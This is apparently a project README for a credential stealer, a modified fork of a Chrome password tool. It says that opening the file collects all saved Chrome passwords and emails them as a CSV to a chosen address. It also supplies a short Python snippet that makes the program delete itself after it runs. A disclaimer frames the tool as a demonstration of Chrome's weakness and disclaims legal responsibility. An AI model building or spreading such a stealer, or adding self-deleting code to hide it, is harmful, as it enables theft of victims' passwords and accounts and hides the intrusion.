This code is a modified version of  https://github.com/hassaanaliw/chromepass and it is has a similar functionality to https://github.com/Ierofantis/Chrome_Venom

When clicking on the file, it will collect all of the chrome passwords and send it to a specifyed email using csv file format.

If you have any suggestions let me know
(In addition if you want program to self destruct after execution add:
from os import remove
from sys import argv
remove(argv[0])
)"
DISCLAIMER

This is only to show how bad chrome is saving your passwords and how voulnerable can anyone be to this type of attack.
I am not responbile if you are breaking the law.
